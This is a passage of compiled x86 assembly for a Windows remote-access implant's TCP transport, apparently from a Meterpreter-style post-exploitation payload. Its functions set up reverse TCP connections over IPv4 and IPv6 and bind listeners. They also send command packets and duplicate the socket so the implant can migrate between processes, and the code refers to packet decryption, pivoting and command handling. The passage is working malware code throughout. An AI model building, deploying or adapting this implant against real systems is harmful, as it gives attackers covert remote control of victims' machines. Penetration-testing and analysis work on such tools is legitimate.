	movl	%eax, -40(%ebp)
	movzbl	-561(%ebp), %eax
	cmpb	$54, %al
	jne	L125
	movl	$63, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_strrchr
	addl	$1, %eax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-40(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-32(%ebp), %edi
	movl	8(%ebp), %eax
	movl	60(%eax), %esi
	movl	8(%ebp), %eax
	movl	56(%eax), %ebx
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_atol
	movl	%edi, 20(%esp)
	movl	%esi, 16(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp6
	movl	%eax, -28(%ebp)
	jmp	L124
L125:
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_atoi
	movw	%ax, -42(%ebp)
	movl	-36(%ebp), %eax
	movzbl	(%eax), %eax
	cmpb	$58, %al
	jne	L126
	movl	-32(%ebp), %edx
	movzwl	-42(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_bind_tcp
	movl	%eax, -28(%ebp)
	jmp	L124
L126:
	movl	-40(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-32(%ebp), %ebx
	movl	8(%ebp), %eax
	movl	60(%eax), %ecx
	movl	8(%ebp), %eax
	movl	56(%eax), %edx
	movzwl	-42(%ebp), %eax
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp4
	movl	%eax, -28(%ebp)
L124:
	cmpl	$0, -28(%ebp)
	jne	L127
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__SetHandleInformation@12, %eax
	call	*%eax
	subl	$12, %esp
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	%eax, 64(%edx)
L127:
	movl	-28(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.globl	_packet_transmit_tcp
	.def	_packet_transmit_tcp;	.scl	2;	.type	32;	.endef
_packet_transmit_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	jmp	L130
L131:
	movl	16(%ebp), %eax
	subl	-12(%ebp), %eax
	movl	%eax, %ecx
	movl	12(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__send@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	addl	%eax, -12(%ebp)
L130:
	movl	-12(%ebp), %eax
	cmpl	16(%ebp), %eax
	jb	L131
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-20(%ebp), %eax
	leave
	ret
	.globl	_transport_write_tcp_config
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
_transport_write_tcp_config:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L135
	cmpl	$0, 12(%ebp)
	je	L135
	movl	8(%ebp), %eax
	movl	52(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 1024(%eax)
	movl	8(%ebp), %eax
	movl	56(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1028(%eax)
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1032(%eax)
	movl	8(%ebp), %eax
	movl	44(%eax), %edx
	movl	12(%ebp), %eax
	movl	$512, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncpy
L135:
	nop
	leave
	ret
	.def	_get_migrate_context_tcp;	.scl	3;	.type	32;	.endef
_get_migrate_context_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$388, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	jne	L137
	movl	$14, %eax
	jmp	L138
L137:
	movl	-12(%ebp), %eax
	leal	16(%eax), %edx
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	(%eax), %eax
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__WSADuplicateSocketA@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	je	L139
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L138
L139:
	movl	20(%ebp), %eax
	movl	$388, (%eax)
	movl	24(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
	movl	$0, %eax
L138:
	leave
	ret
	.def	_transport_get_config_size_tcp;	.scl	3;	.type	32;	.endef
_transport_get_config_size_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	movl	$1036, %eax
	popl	%ebp
	ret
	.globl	_transport_create_tcp
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
_transport_create_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$76, (%esp)
	call	_malloc
	movl	%eax, -12(%ebp)
	movl	$8, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	cmpl	$0, 12(%ebp)
	je	L143
	movl	12(%ebp), %eax
	movl	$1036, (%eax)
L143:
	movl	$76, 8(%esp)
	movl	$0, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$8, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-12(%ebp), %eax
	movl	$1, (%eax)
	movl	8(%ebp), %eax
	movl	1024(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 52(%eax)
	movl	8(%ebp), %eax
	movl	1028(%eax), %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movl	%edx, 56(%eax)
	movl	8(%ebp), %eax
	movl	1032(%eax), %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movl	%edx, 60(%eax)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-12(%ebp), %edx
	movl	%eax, 44(%edx)
	movl	-12(%ebp), %eax
	movl	$_packet_transmit_tcp, 36(%eax)
	movl	-12(%ebp), %eax
	movl	$_configure_tcp_connection, 20(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_destroy_tcp, 28(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_reset_tcp, 16(%eax)
	movl	-12(%ebp), %eax
	movl	$_server_dispatch_tcp, 32(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_get_handle_tcp, 4(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_set_handle_tcp, 8(%eax)
	movl	-12(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, 48(%eax)
	call	_current_unix_timestamp
	movl	-12(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	-12(%ebp), %eax
	movl	$_get_migrate_context_tcp, 40(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_get_config_size_tcp, 12(%eax)
	movl	-12(%ebp), %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_decrypt_packet;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_pivot_packet_dispatch;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_event_poll;	.scl	2;	.type	32;	.endef
	.def	_command_handle;	.scl	2;	.type	32;	.endef
	.def	_thread_destroy;	.scl	2;	.type	32;	.endef
	.def	_thread_create;	.scl	2;	.type	32;	.endef
	.def	_thread_run;	.scl	2;	.type	32;	.endef
	.def	_strncmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_strrchr;	.scl	2;	.type	32;	.endef
	.def	_atol;	.scl	2;	.type	32;	.endef
	.def	_atoi;	.scl	2;	.type	32;	.endef
	.def	_wcsncpy;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
